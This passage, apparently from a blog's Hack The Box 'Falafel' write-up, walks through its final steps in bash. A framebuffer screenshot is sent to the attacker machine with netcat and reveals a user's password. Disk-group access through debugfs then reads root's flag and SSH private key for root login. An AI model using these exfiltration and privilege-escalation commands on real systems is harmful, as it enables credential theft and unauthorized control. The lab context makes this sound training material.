<img src="{{ site.img_path }}/falafel_writeup/Falafel_85.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_86.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_87.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_88.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_89.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_90.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I have access to the **Screen's Frame Buffer** I can take a screenshot and transfer it to my attacking machine to open it with some tool and see if it has any relevant information. After transferring it, I check with `md5sum` the integrity of the file, as I am working in a virtual machine I don't have many tools installed so I will have to install **Gimp** to be able to analyze the file. There is a problem with the visibility of the capture because **I don't have the precise dimensions** of it.

> **[The Frame Buffer Device](https://www.kernel.org/doc/html/latest/fb/framebuffer.html){:target="_blank"}**: The frame buffer device provides an abstraction for the graphics hardware. It represents the frame buffer of some video hardware and allows application software to access the graphics hardware through a well-defined interface, so the software doesn’t need to know anything about the low-level (**hardware register**) stuff. The device is accessed through special device nodes, usually located in the **/dev** directory, i.e. **/dev/fb***.

> **Victime Machine**:

```bash
cd /dev/shm
cp /dev/fb0 screenshot
file screenshot
du -hc screenshot
```

> **Attacker Machine**:

```bash
nc -nlvp 443 > screenshot
```

> **Victime Machine**:

```bash
md5sum screenshot
du -hc screenshot

nc 10.10.14.238 443 < screenshot
```

> **Attacker Machine**:

```bash
md5sum screenshot                                 # :)

sudo apt search \^gimp
sudo apt install gimp
gimp &>/dev/null & disown
# Raw image data
# Scanline?
```

<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_91.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_92.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_93.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_94.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_95.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I find the article **[“How do I get fb0 scanline length?”](https://unix.stackexchange.com/questions/538763/how-do-i-get-fb0-scanline-length){:target="_blank"}** in which it tells me how to search in **Linux** for the dimensions I need to clearly see the screenshot I was able to extract earlier. After performing a recursive search and accessing a symbolic link I can finally get the values of both the **height** and **width** of the screenshot, and after adjusting the **Pixel format** I see that it is the image of the shell with a password of the user **yossi**.

```bash
find / \-name fb0 2>/dev/null
ls -l /sys/class/graphics/fb0
# Symbolic link!
ls -l /sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0
cat /sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size
# 1176,885
```

<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_96.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_97.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_98.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have a new password I can perform a **User pivoting** and investigate what new privileges or permissions I have. The user **yossi** belongs to the **disk** group, which leads me to do a little research on the **Internet** and find the article **[“Disk Group Privilege Escalation”](https://www.hackingarticles.in/disk-group-privilege-escalation/
){:target="_blank"}** by **Raj Chandel** which would give me all the help I need to finish compromising the box. As I belong to the group that owns the system partitions I can use the `debugfs` tool to manage them, in my case I'm going to use it first to see the content of the last flag and then the **root** user **id_rsa** to create persistence in the system and access using **SSH** as the user with maximum privilege. Finally I have engaged the entire lab.

> **Disk Group Privilege Escalation**: After the partition is selected, now to examine and modify the partition the `debugfs` utility can be used in **Linux**. This utility can also be used to create a directory or read the contents of a directory. Attackers exploit vulnerabilities or misconfigurations linked to **/dev/sda** and similar devices to gain unauthorized access to sensitive data or exploit associated vulnerabilities.

> **Victime Machine**:

```bash
su yossi
whoami
# :)
id
groups
# disk
sudo -l
find / \-name disk 2>/dev/null
find / \-group disk 2>/dev/null

ls -l /dev/sda2
ls -l /dev/sda1

fdisk -l
df -h

debugfs /dev/sda1
cat /root/root.txt
cat /root/.ssh/id_rsa
quit
```

> **Attacker Machine**:

```bash
nvim id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.129.229.139
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I
```

<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_99.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_103.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a **very difficult** machine to engage, but every day I practice I internalize more concepts and improve my skills, I know there is still a long way to go but it is very rewarding to go through it and even more if you can appeal to the different **Hacking communities** that give you all the help you need to move forward when you are lost or frustrated for not finding the way to face a complex challenge. **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs are always a great source of knowledge, so I kill this box to choose the next one.

<br /><br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_104.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
